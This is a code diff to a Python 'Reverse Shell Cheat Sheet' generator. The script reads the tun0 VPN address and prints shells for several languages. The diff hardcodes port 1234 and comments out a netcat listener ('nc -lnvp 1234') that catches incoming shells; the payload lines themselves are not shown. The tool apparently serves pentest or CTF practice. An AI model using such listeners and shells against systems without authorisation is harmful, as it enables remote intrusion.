@@ -16,12 +16,10 @@ print(f"{bcolors.HEADER}Reverse Shell Cheat Sheet\n")
 # Setup parser
 parser = optparse.OptionParser(usage = "revshells.py -l [language] -p [1-9999]")
 parser.add_option("-l", "--lang", dest="lang", help="Shell type: Bash, Perl, Python, PHP, Ruby, Netcat")
-parser.add_option("-p", "--port", dest="port", help="Port to listen on. 0 = no listener")
 
 (options, args) = parser.parse_args()
 
 lang = str(options.lang)
-port = options.port
 lang = lang.lower()
 
 # Getting the tun0
@@ -36,8 +34,7 @@ except:
     print(f"{bcolors.BOLD}An error occured!\nExiting...")
     sys.exit()
 
-print("tun0 IP:" + tun0)
-print("Port:" + port)
+print("tun0 IP: " + tun0 + "\nPort: 1234")
 # Cheat sheet
 
 # Bash
@@ -73,13 +70,12 @@ if (lang == "netcat" or lang == "nc"):
     print(netcat)
 
 # Listener
-if (port != 0):
-    print("Setting up listener...") # + port
-    import subprocess
-
-    while 1:
-        command = 'nc -lnvp '+port
-        x = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
+'''
+if (1 == 1):
+    print("Setting up listener on port 1234...")
+    import pty
+    pty.spawn("nc -lnvp 1234")
 
 else:
     sys.exit()
+'''
